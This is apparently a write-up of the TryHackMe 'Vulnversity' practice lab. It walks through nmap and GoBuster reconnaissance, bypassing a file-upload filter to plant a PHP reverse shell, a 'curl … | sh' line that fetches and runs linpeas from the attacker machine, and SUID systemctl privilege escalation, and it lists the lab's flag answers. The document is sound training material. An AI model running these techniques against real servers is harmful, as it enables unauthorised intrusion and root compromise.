#  [Vulnversity](https://tryhackme.com/room/vulnversity)

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Vulnversity |
| Difficulty | Easy |
| Tags | recon, priv-esc, video, webappsec|



---

```bash
export IP=10.10.93.0
```

---

```bash
nmap -sC -sV -A -v -oN nmap/initial.nmap $IP
```

### Task 1: Deploy The Machine

Machine IP: 10.10.77.241
### Task 2: Reconnaissance

1. Scan this box: `nmap -sV 10.10.77.241`.

   This command will scan the machine with the specified IP using nmap, determining what are the versions of the running services. Questions 2, 3, 6 and 7 can be answered by simply analyzing the scan results

2. Scan the box, how many ports are open?

   > 6

3. What version of the squid proxy is running on the machine?

   > 3.5.12

4. How many ports will nmap scan if the flag -p-400 was used?

   > 400

   According to nmap's manual pages (`man nmap`), the -p- flag is used to scan through ports from 1 to 400.

5. Using the nmap flag -n what will it not resolve?

   > DNS

   Also according to nmap's manual pages, the -n flag can be used to never do DNS resolution.

6. What is the most likely operating system this machine is running?

   > Ubuntu

   The machine's OS can be found by using the -O flag when scanning the machine. So, this command would be used `nmap -O 10.10.77.241`. Or, looking closely at the previous scan results, notice that the version of SSH used is OpenSSH 7.2p2 Ubuntu 4ubuntu2.7.

7. What port is the web server running on?

   > 3333

   In the scan results, notice that the http service is running on port 3333.

8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

   > No answer needed

### Task 3: Locating directories using GoBuster

1. Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.

   GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.
   Download [GoBuster](https://github.com/OJ/gobuster), or if you're on Kali Linux 2020.1+ run `sudo apt-get install gobuster`.
   To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using Kali Linux you can find many wordlists under /usr/share/wordlists.
   Now lets run GoBuster with a wordlist: `gobuster diir -u http://<ip>:3333 -w <word list location>`

   > No answer needed.

   Since I am using Kali Linux, I simply ran the command `gobuster dir -u http://10.10.77.241:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`. The -u flag is followed by the target URL, the -w flag is followed by the path of the wordlist used. In this case, I used the directory-list-lowercase-2.3-medium.txt file from the /usr/share/wordlists/dirbuster directory.

2. What is the directory that has an upload form page?

   > /internal/

   After leaving GoBuster to scan the website for hidden directories, notice that one of the directories found is named /internal.

![gobuster](https://user-images.githubusercontent.com/87711310/209367538-30df33e9-8bbe-4b0e-bed0-71cb654b9d1d.png)

### Task 4: Compromise the webserver

After accessing `http://10.10.77.241:3333/internal`, the browser will display a page containing a file upload form.

![upload_form](https://user-images.githubusercontent.com/87711310/209367544-69f725e4-2c11-4639-addd-fbe1680dd481.png)

1. Try upload a few file types to the server, what common extension seems to be blocked?

   > php

   To see what extensions the server accepts, we can try uploading files manually or by using Burpsuite.

   Mainly, PHP is of interest to us, because PHP is the most common backend programming language used for web applications. 

2. To identify which extensions are not blocked, we're going to fuzz the upload form.

   > No answer needed.

3. We're going to use Intruder (used for automating customised attacks).
   To begin, make a wordlist with the following extensions in:

   ![wordlist](https://user-images.githubusercontent.com/87711310/209367546-02cfae0e-05c9-40b8-8897-24d8c55b0ff3.png)


   Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.
   Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:

   ![burpsuite](https://user-images.githubusercontent.com/87711310/209367549-42e865d1-6ed6-467d-ad04-d9b9814cbb10.png)

   Run this attack, what extension is allowed?

   > phtml

4. Now we know what extension we can use for our payload we can progress.
   We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!
   Download the following [reverse PHP shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
   To gain remote access to this machine, follow these steps:
   1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
   2. Rename this file to php-reverse-shell.phtml
   3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`
   4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
   5. You should see a connection on your netcat session

   ![netcat](https://user-images.githubusercontent.com/87711310/209367557-e2af63a3-1929-4573-a6f7-6cc12d1e16f3.png)


   > No answer needed

   I simply followed the steps described in this question. The reverse shell is successful.

   ![reverse_shell](https://user-images.githubusercontent.com/87711310/209367552-6d818073-b03e-42aa-9a53-2a0ddfc4b2ea.png)

5. What is the name of the user who manages the webserver?

   > bill

   Since I have access to the webserver, I simply check what users can be found in the /home directory.

   ![ls_cmd](https://user-images.githubusercontent.com/87711310/209367563-3e727aff-f17f-4bba-8360-f0191934d2dd.png)

6. What is the user flag?

   > 8bd7992fbe8a6ad22a63361004cfcedb

   The user flag is found in the user.txt file from the /home/bill directory.

   ![flag](https://user-images.githubusercontent.com/87711310/209367566-dcf01698-b6fd-458f-8ef9-497e8f586b99.png)

### Task 5: Priviledge Escalation

1. In Linux, SUID (**set owner userId upon execution**) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
   For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

   On the system, search for all SUID files. What file stands out?

   > /bin/systemctl

   Okay, I'm gonna admit, I needed a little help for this one. So, after some research and reading, I found PEASS - Privilege Escalation Awesome Scripts SUITE, download it [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). The script needs to be put on the vulnerable webserver, to perform the enumeration. I started a Python HTTP server on my own machine, using the `python3 -m http.server 80` command and on the webserver, I transfered the file with curl (`curl <my_tun0_ip>/linpeas.sh | sh`).

   ![peass](https://user-images.githubusercontent.com/87711310/209367568-6b56a6d7-8b65-4885-983e-8b56b132a5b9.png)

   As shown in the above screenshot, the RED/YELLOW highlights are objects that can be used for PE. After waiting for PEASS to finish running, we find /bin/systemctl in the Interesting Files section.

   ![peass1](https://user-images.githubusercontent.com/87711310/209367572-6b7a1614-4807-4b36-8b16-4c6a9629ce42.png)

2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
   Become root and get the last flag (/root/root.txt)

   > a58ff8579f0a9270368d33a9966c7fd5

   Now we need to use /bin/systemctl to become root. For this, I used [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/). Here's a screenshot of the explanation.

   ![gtfobins](https://user-images.githubusercontent.com/87711310/209367575-af5f0e00-77f4-4e05-bf62-54348601f2a1.png)

   After running the above commands, replacing id with the command we want to run as root (`cat /root/root.txt`), we start the service. The flag is written to /tmp/output.
